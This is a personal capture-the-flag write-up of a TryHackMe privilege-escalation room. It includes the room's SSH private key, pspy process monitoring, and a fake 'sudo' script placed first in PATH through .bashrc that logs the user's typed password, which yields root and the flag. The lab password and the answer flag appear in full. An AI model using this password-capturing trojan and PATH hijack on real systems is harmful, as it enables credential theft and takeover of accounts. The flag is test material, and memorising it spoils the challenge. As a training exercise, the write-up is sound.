---
Listen closely, you might hear a password!
---

![111](https://tryhackme-images.s3.amazonaws.com/room-icons/de6446e44292ce978b994c0992f81803.png)

### Download Keys

 Download Task Files

Hello again, hacker. After uncovering a user Frank's SSH private key, you've broken into a target environment.

**Download the SSH private key attached.**

**Note:** If you are using the AttackBox, you can copy and paste the SSH private key using the "Clipboard" icon located on the slide-out tray, as demonstrated by the GIF below:

![A GIF demonstrating using the slide-out tray to copy and paste into the AttackBox](https://tryhackme-images.s3.amazonaws.com/user-uploads/5cf70eb43cffd364046f5c83/room-content/cdd52d5a28541712f93be4fe18291b31.gif)  

Answer the questions below

Download the attached file.

 Completed

### Find the Flag

 Start Machine

You have access under `frank`, but you want to be `root`! How can you escalate privileges? If you listen closely, maybe you can uncover something that might help!

_Note: Please allow 3-5 minutes for the VM to boot up fully before attempting the challenge._

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ cat idrsa.id-rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
F5iAvxBl12p5cAAAAKam9obkBhbGllbgE=
-----END OPENSSH PRIVATE KEY-----


┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 idrsa.id-rsa             
                                                                                             
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -i idrsa.id-rsa frank@10.10.85.42
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Mar  2 16:49:31 2023 from 172.18.0.3
frank@workstation:~$ whoami
frank

frank@workstation:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root root        84K Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root root        52K Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root        87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        55K Feb  7  2022 /usr/bin/mount
-rwsr-xr-x 1 root root        44K Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root        67K Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root        67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root       163K Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root        39K Feb  7  2022 /usr/bin/umount
-rwsr-xr-- 1 root messagebus  51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root       463K Dec  2  2021 /usr/lib/openssh/ssh-keysign

frank@workstation:~$ sudo -l
[sudo] password for frank: 
Sorry, try again.
[sudo] password for frank: 
Sorry, try again.
[sudo] password for frank: 
sudo: 3 incorrect password attempts

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
10.10.85.42 - - [02/Mar/2023 11:55:27] "GET /pspy64 HTTP/1.1" 200 -


frank@workstation:/tmp$ wget http://10.8.19.103:7070/pspy64
--2023-03-02 16:55:27--  http://10.8.19.103:7070/pspy64
Connecting to 10.8.19.103:7070... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                  100%[============================>]   2.96M   812KB/s    in 3.7s    

2023-03-02 16:55:32 (812 KB/s) - ‘pspy64’ saved [3104768/3104768]

frank@workstation:/tmp$ chmod +x pspy64 
frank@workstation:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/03/02 16:56:19 CMD: UID=1000  PID=1790   | ./pspy64 
2023/03/02 16:56:19 CMD: UID=1000  PID=1011   | -bash 
2023/03/02 16:56:19 CMD: UID=1000  PID=1010   | sshd: frank@pts/0    
2023/03/02 16:56:19 CMD: UID=0     PID=996    | sshd: frank [priv]   
2023/03/02 16:56:19 CMD: UID=0     PID=1      | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2023/03/02 16:56:34 CMD: UID=0     PID=1797   | sshd: [accepted]  
2023/03/02 16:56:34 CMD: UID=0     PID=1798   | sshd: [accepted]     
2023/03/02 16:56:34 CMD: UID=0     PID=1799   | sshd: frank [priv]   
2023/03/02 16:56:34 CMD: UID=0     PID=1800   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2023/03/02 16:56:34 CMD: UID=0     PID=1801   | run-parts --lsbsysinit /etc/update-motd.d 
2023/03/02 16:56:34 CMD: UID=0     PID=1802   | /bin/sh /etc/update-motd.d/00-header 
2023/03/02 16:56:34 CMD: UID=0     PID=1803   | /bin/sh /etc/update-motd.d/00-header 
2023/03/02 16:56:34 CMD: UID=0     PID=1804   | /bin/sh /etc/update-motd.d/00-header 
2023/03/02 16:56:34 CMD: UID=0     PID=1805   | run-parts --lsbsysinit /etc/update-motd.d 
2023/03/02 16:56:34 CMD: UID=0     PID=1806   | run-parts --lsbsysinit /etc/update-motd.d 
2023/03/02 16:56:34 CMD: UID=0     PID=1807   | run-parts --lsbsysinit /etc/update-motd.d 
2023/03/02 16:56:34 CMD: UID=0     PID=1808   | sshd: frank [priv]   
2023/03/02 16:56:34 CMD: UID=1000  PID=1809   | sshd: frank@pts/1    
2023/03/02 16:56:35 CMD: UID=1000  PID=1810   | sshd: frank@pts/1    
2023/03/02 16:56:36 CMD: UID=1000  PID=1811   | sshd: frank@pts/1    
2023/03/02 16:56:37 CMD: UID=1000  PID=1812   | sshd: frank@pts/1    
2023/03/02 16:56:37 CMD: UID=1000  PID=1813   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1814   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1815   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1816   | /bin/sh /etc/init.d/dbus status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1818   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1817   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1819   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1820   | /bin/sh /etc/init.d/hwclock.sh status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1822   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1821   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1823   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1824   | /bin/sh /etc/init.d/procps status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1825   | /bin/sh /etc/init.d/procps status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1826   | /bin/sh /etc/init.d/procps status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1827   | /bin/sh /etc/init.d/procps status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1829   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1828   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1830   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1833   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1832   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1831   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1834   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1835   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1836   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:56:37 CMD: UID=1000  PID=1838   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:37 CMD: UID=1000  PID=1837   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:56:38 CMD: UID=1000  PID=1839   | sshd: frank@pts/1    
2023/03/02 16:56:39 CMD: UID=1000  PID=1840   | sshd: frank@pts/1    
2023/03/02 16:56:39 CMD: UID=0     PID=1841   | sudo cat /etc/shadow 
2023/03/02 16:56:59 CMD: UID=0     PID=1842   | sshd: [accepted]  
2023/03/02 16:56:59 CMD: UID=0     PID=1843   | sshd: [accepted]     
2023/03/02 16:56:59 CMD: UID=0     PID=1844   | sshd: frank [priv]   
2023/03/02 16:56:59 CMD: UID=0     PID=1845   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2023/03/02 16:56:59 CMD: UID=0     PID=1846   | run-parts --lsbsysinit /etc/update-motd.d 
2023/03/02 16:56:59 CMD: UID=0     PID=1847   | /bin/sh /etc/update-motd.d/00-header 
2023/03/02 16:56:59 CMD: UID=0     PID=1848   | /bin/sh /etc/update-motd.d/00-header 
2023/03/02 16:56:59 CMD: UID=0     PID=1849   | /bin/sh /etc/update-motd.d/00-header 
2023/03/02 16:56:59 CMD: UID=0     PID=1850   | run-parts --lsbsysinit /etc/update-motd.d 
2023/03/02 16:56:59 CMD: UID=0     PID=1851   | run-parts --lsbsysinit /etc/update-motd.d 
2023/03/02 16:56:59 CMD: UID=0     PID=1852   | run-parts --lsbsysinit /etc/update-motd.d 
2023/03/02 16:56:59 CMD: UID=0     PID=1853   | sshd: frank [priv]   
2023/03/02 16:56:59 CMD: UID=1000  PID=1854   | sshd: frank@pts/1    
2023/03/02 16:57:00 CMD: UID=1000  PID=1855   | sshd: frank@pts/1    
2023/03/02 16:57:01 CMD: UID=1000  PID=1856   | sshd: frank@pts/1    
2023/03/02 16:57:02 CMD: UID=1000  PID=1857   | sshd: frank@pts/1    
2023/03/02 16:57:02 CMD: UID=1000  PID=1858   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1859   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1860   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1861   | /bin/sh /etc/init.d/dbus status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1863   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1862   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1864   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1865   | /bin/sh /etc/init.d/hwclock.sh status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1867   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1866   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1868   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1869   | /bin/sh /etc/init.d/procps status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1870   | /bin/sh /etc/init.d/procps status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1871   | /bin/sh /etc/init.d/procps status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1872   | /bin/sh /etc/init.d/procps status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1874   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1873   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1875   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1878   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1877   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1876   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1879   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1880   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1881   | /bin/sh /etc/init.d/ssh status 
2023/03/02 16:57:02 CMD: UID=1000  PID=1883   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:02 CMD: UID=1000  PID=1882   | /bin/sh /usr/sbin/service --status-all 
2023/03/02 16:57:03 CMD: UID=1000  PID=1884   | sshd: frank@pts/1    
2023/03/02 16:57:04 CMD: UID=1000  PID=1885   | sshd: frank@pts/1    
2023/03/02 16:57:05 CMD: UID=0     PID=1886   | sudo cat /etc/shadow 

frank@workstation:/tmp$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.7  12172  7224 ?        Ss   16:40   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         996  0.0  0.9  13576  9032 ?        Ss   16:49   0:00 sshd: frank [priv]
frank       1010  0.2  0.7  15264  7656 ?        S    16:49   0:02 sshd: frank@pts/0
frank       1011  0.0  0.3   5992  3896 pts/0    Ss   16:49   0:00 -bash
frank       2657  0.0  0.3   7644  3232 pts/0    R+   17:04   0:00 ps aux

frank@workstation:/tmp$ netstat -tulpn
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:34385        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.11:48841        0.0.0.0:*                           -                   

frank@workstation:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

frank@workstation:/tmp$ cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.18.0.2	workstation

frank@workstation:/tmp$ tcpdump -A -i eth1 -w /tmp/tcpdump.pcap
-bash: tcpdump: command not found

frank@workstation:/tmp$ ethercap
-bash: ethercap: command not found

frank@workstation:~$ pwd
/home/frank
frank@workstation:~$ ls -lah
total 32K
drwxr-xr-x 1 frank frank 4.0K Mar 14  2022 .
drwxr-xr-x 1 root  root  4.0K Mar 14  2022 ..
lrwxrwxrwx 1 frank frank    9 Mar 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 frank frank 3.7K Feb 25  2020 .bashrc
drwx------ 2 frank frank 4.0K Mar 14  2022 .cache
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
drwxr-xr-x 1 frank frank 4.0K Mar 14  2022 .ssh
-rw-r--r-- 1 frank frank    0 Mar 14  2022 .sudo_as_admin_successful
frank@workstation:~$ head .bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

`bashrc` stands for "Bourne-Again SHell Run Commands", and it is a shell script that is run by Bash, the default shell for most Linux distributions and macOS. The `bashrc` file contains a set of commands that are executed every time a new Bash shell is started.

The `bashrc` file is typically located in the user's home directory (`~/.bashrc`) and can be edited using a text editor such as `nano` or `vim`. The file can be used to customize the behavior of the Bash shell, including setting environment variables, defining aliases, and creating functions.

Some common examples of customizations that can be made in the `bashrc` file include setting the default prompt, adding directories to the system path, and defining shortcuts for frequently used commands.

It's important to note that changes made to the `bashrc` file only take effect in new Bash shells that are started after the changes have been made. If you want to apply the changes immediately, you can either log out and log back in, or run the command `source ~/.bashrc` to reload the `bashrc` file in the current shell.

you can change the PATH environment variable in the `bashrc` file to add directories to the system path.

The PATH environment variable is a list of directories separated by colons (`:`), and it tells the shell where to look for executable files when a command is entered. By default, the PATH variable includes system directories such as `/usr/bin` and `/usr/local/bin`, but you can add additional directories to the PATH by modifying the `bashrc` file.

In the command `export PATH=/home/frank/bin:$PATH`, the `/home/frank/bin` directory is added to the beginning of the `PATH` variable. This means that when you enter a command, the shell will first search for an executable file in `/home/frank/bin`, and if it doesn't find the file there, it will continue searching in the directories listed in the rest of the `PATH` variable.

In the command `export PATH=$PATH:/home/frank/bin`, the `/home/frank/bin` directory is added to the end of the `PATH` variable. This means that the shell will search for an executable file in all of the directories listed in the `PATH` variable first, and if it doesn't find the file in any of those directories, it will then search in `/home/frank/bin`.

So, depending on the situation, one command may be more appropriate than the other. If you want to give priority to executables in a specific directory, you should use the first command. If you want to add a new directory to the existing `PATH` variable, you should use the second command.

so let's choose the first

placing a false 'sudo' file to be executed

frank@workstation:~$ /bin/sudo  -l
[sudo] password for frank: 
Sorry, try again.
[sudo] password for frank: 
Sorry, try again.
[sudo] password for frank: 
sudo: 3 incorrect password attempts

Creating a "bin" directory is a common convention in Unix-like systems, and it is often used to store executable files and scripts that can be run from the command line. By convention, the directories `/bin`, `/usr/bin`, and `/usr/local/bin` are reserved for system executables, while the directory `~/bin` (i.e., a "bin" directory in the user's home directory) is often used for user-specific executables and scripts.

frank@workstation:~$ mkdir ./bin
frank@workstation:~$ ls -lah
total 36K
drwxr-xr-x 1 frank frank 4.0K Mar  2 18:45 .
drwxr-xr-x 1 root  root  4.0K Mar 14  2022 ..
lrwxrwxrwx 1 frank frank    9 Mar 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 frank frank 3.7K Feb 25  2020 .bashrc
drwx------ 2 frank frank 4.0K Mar 14  2022 .cache
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
drwxr-xr-x 1 frank frank 4.0K Mar 14  2022 .ssh
-rw-r--r-- 1 frank frank    0 Mar 14  2022 .sudo_as_admin_successful
drwxrwxr-x 2 frank frank 4.0K Mar  2 18:45 bin
frank@workstation:~$ ls
bin


The `mkdir ./bin` command creates a new directory called "bin" in the current directory.

frank@workstation:~/bin$ nano sudo
frank@workstation:~/bin$ chmod +x sudo
frank@workstation:~/bin$ cat sudo
#!/bin/bash
read password
echo $password >> /home/frank/password_L.txt

frank@workstation:~/bin$ cd ..
frank@workstation:~$ nano .bashrc
frank@workstation:~$ head .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

export PATH=/home/frank/bin:$PATH

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;

frank@workstation:~$ chmod +x ./bin/sudo
frank@workstation:~$ ls
bin  password_L.txt

frank@workstation:~$ cat password_L.txt 
!@#frankisawesome2022%*
!@#frankisawesome2022%*
!@#frankisawesome2022%*
!@#frankisawesome2022%*
!@#frankisawesome2022%*
!@#frankisawesome2022%*

frank@workstation:~$ sudo -l
[sudo] password for frank: !@#frankisawesome2022%*
Matching Defaults entries for frank on workstation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on workstation:
    (ALL : ALL) ALL
frank@workstation:~$ sudo -s
root@workstation:/home/frank# cd /root
root@workstation:~# ls
flag.txt
root@workstation:~# cat flag.txt 
flag{14370304172628f784d8e8962d54a600}
root@workstation:~# ls -lah
total 20K
drwx------ 1 root root 4.0K Mar 14  2022 .
drwxr-xr-x 1 root root 4.0K Mar 14  2022 ..
-rw-r--r-- 1 root root 3.1K Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw-r--r-- 1 root root   39 Mar 14  2022 flag.txt
root@workstation:~# cat .profile 
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n 2> /dev/null || true
root@workstation:~# head .bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# don't put duplicate lines in the history. See bash(1) for more options
# ... or force ignoredups and ignorespace
HISTCONTROL=ignoredups:ignorespace
root@workstation:~# ls -lah /
total 68K
drwxr-xr-x   1 root root 4.0K Mar 14  2022 .
drwxr-xr-x   1 root root 4.0K Mar 14  2022 ..
-rwxr-xr-x   1 root root    0 Mar 14  2022 .dockerenv
lrwxrwxrwx   1 root root    7 Mar  2  2022 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Apr 15  2020 boot
drwxr-xr-x   5 root root  340 Mar  2 16:40 dev
drwxr-xr-x   1 root root 4.0K Mar 14  2022 etc
drwxr-xr-x   1 root root 4.0K Mar 14  2022 home
lrwxrwxrwx   1 root root    7 Mar  2  2022 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Mar  2  2022 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Mar  2  2022 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Mar  2  2022 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4.0K Mar  2  2022 media
drwxr-xr-x   2 root root 4.0K Mar  2  2022 mnt
drwxr-xr-x   2 root root 4.0K Mar  2  2022 opt
dr-xr-xr-x 156 root root    0 Mar  2 16:40 proc
drwx------   1 root root 4.0K Mar 14  2022 root
drwxr-xr-x   1 root root 4.0K Mar  2 18:55 run
lrwxrwxrwx   1 root root    8 Mar  2  2022 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Mar  2  2022 srv
dr-xr-xr-x  13 root root    0 Mar  2 16:40 sys
drwxrwxrwt   1 root root 4.0K Mar  2 16:55 tmp
drwxr-xr-x   1 root root 4.0K Mar  2  2022 usr
drwxr-xr-x   1 root root 4.0K Mar  2  2022 var

We were in a container I knew it
```

What is the flag in root's home directory?

What's going on in the system?

*flag{14370304172628f784d8e8962d54a600}*

[[BlueTeam]]